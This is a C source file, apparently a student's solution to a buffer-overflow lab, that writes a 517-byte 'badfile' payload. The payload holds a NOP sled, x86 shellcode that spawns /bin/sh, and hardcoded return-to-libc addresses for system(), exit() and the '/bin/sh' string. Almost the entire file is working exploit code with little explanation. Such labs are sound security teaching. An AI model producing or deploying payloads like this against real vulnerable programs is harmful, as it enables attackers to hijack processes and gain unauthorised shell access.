/* exploit.c */
/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x50" /* Line 2: pushl %eax */
"\x68""//sh" /* Line 3: pushl $0x68732f2f */
"\x68""/bin" /* Line 4: pushl $0x6e69622f */
"\x89\xe3" /* Line 5: movl %esp,%ebx */
"\x50" /* Line 6: pushl %eax */
"\x53" /* Line 7: pushl %ebx */
"\x89\xe1" /* Line 8: movl %esp,%ecx */
"\x99" /* Line 9: cdq */
"\xb0\x0b" /* Line 10: movb $0x0b,%al */
"\xcd\x80" /* Line 11: int $0x80 */
;

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);
	/* You need to fill the buffer with appropriate contents here */
	/* ... Put your code here ... */
	long *tmp = (long *) buffer;
	*(tmp + 9) = 0xb7e42da0;   //  system()
	*(tmp + 10) = 0xb7e369d0;   //  exit()
	*(tmp + 11) = 0xb7f6382b;   //  "/bin/sh"
	
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}